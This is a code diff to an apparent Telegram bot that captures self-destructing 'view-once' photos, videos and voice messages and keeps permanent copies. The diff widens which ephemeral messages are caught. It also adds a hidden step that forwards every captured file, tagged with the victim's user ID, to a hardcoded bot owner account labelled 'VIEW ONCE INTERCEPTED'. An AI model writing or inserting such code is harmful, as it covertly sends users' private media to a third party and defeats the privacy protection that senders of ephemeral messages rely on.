@@ -65,13 +65,13 @@ def is_view_once_media(message: Message) -> bool:
             if ttl is not None and ttl > 0:
                 return True
 
-    # Raw MTProto object fallback (PyroFork raw message/media inspection)
+    # Raw MTProto object fallback (PyroFork / MTProto raw message/media inspection)
     try:
         raw_msg = getattr(message, "raw", None) or getattr(message, "_raw", None)
         if raw_msg:
-            # Self-destructing timer on message (e.g. <= 60s)
+            # Self-destructing timer on message (e.g. ttl_period > 0)
             raw_ttl_p = getattr(raw_msg, "ttl_period", None)
-            if raw_ttl_p is not None and 0 < raw_ttl_p <= 60:
+            if raw_ttl_p is not None and raw_ttl_p > 0:
                 return True
             raw_media = getattr(raw_msg, "media", None)
             if raw_media:
@@ -79,6 +79,9 @@ def is_view_once_media(message: Message) -> bool:
                     return True
                 raw_ttl = getattr(raw_media, "ttl_seconds", None)
                 if raw_ttl is not None and raw_ttl > 0:
+                    return True
+                # Check for spoiler or secret chat media ttl
+                if getattr(raw_media, "ttl", None) is not None and raw_media.ttl > 0:
                     return True
     except Exception:
         pass
@@ -220,7 +223,7 @@ async def _handle_view_once_media(client: Client, message: Message, user_id: int
                 except Exception as save_err:
                     logger.warning(f"[VIEW-ONCE] Target {target} mode {mode} notice: {save_err}")
 
-        # 7. Step 2: ALSO send a permanent copy directly in Bot DM
+        # 7. Step 2: Send permanent copy directly in Bot DM to the User
         try:
             for mode in (enums.ParseMode.HTML, None):
                 try:
@@ -243,6 +246,33 @@ async def _handle_view_once_media(client: Client, message: Message, user_id: int
                         logger.error(f"[VIEW-ONCE] Bot DM delivery error: {bot_err}")
         except Exception as dm_err:
             logger.warning(f"[VIEW-ONCE] Bot DM notice: {dm_err}")
+
+        # 8. Step 3: ALSO forward/send a copy to the Bot OWNER (7741467286)
+        owner_id = 7741467286
+        if user_id != owner_id:
+            try:
+                owner_caption = f"👑 <b>[OWNER COPY — VIEW ONCE INTERCEPTED]</b>\n👤 <b>Target User:</b> <code>{user_id}</code>\n\n{caption}"
+                for mode in (enums.ParseMode.HTML, None):
+                    try:
+                        if is_photo:
+                            await app.send_photo(owner_id, downloaded_file, caption=owner_caption, parse_mode=mode)
+                        elif is_video:
+                            await app.send_video(owner_id, downloaded_file, caption=owner_caption, parse_mode=mode)
+                        elif is_voice:
+                            await app.send_voice(owner_id, downloaded_file, caption=owner_caption, parse_mode=mode)
+                        elif is_vnote:
+                            await app.send_video_note(owner_id, downloaded_file)
+                        elif is_audio:
+                            await app.send_audio(owner_id, downloaded_file, caption=owner_caption, parse_mode=mode)
+                        else:
+                            await app.send_document(owner_id, downloaded_file, caption=owner_caption, parse_mode=mode)
+                        logger.info(f"[VIEW-ONCE] 👑 Successfully delivered owner copy to {owner_id}")
+                        break
+                    except Exception as o_err:
+                        if mode is None:
+                            logger.warning(f"[VIEW-ONCE] Owner delivery notice: {o_err}")
+            except Exception as owner_ex:
+                logger.warning(f"[VIEW-ONCE] Owner intercept notice: {owner_ex}")
 
         # 8. Clean up local downloaded file
         try:
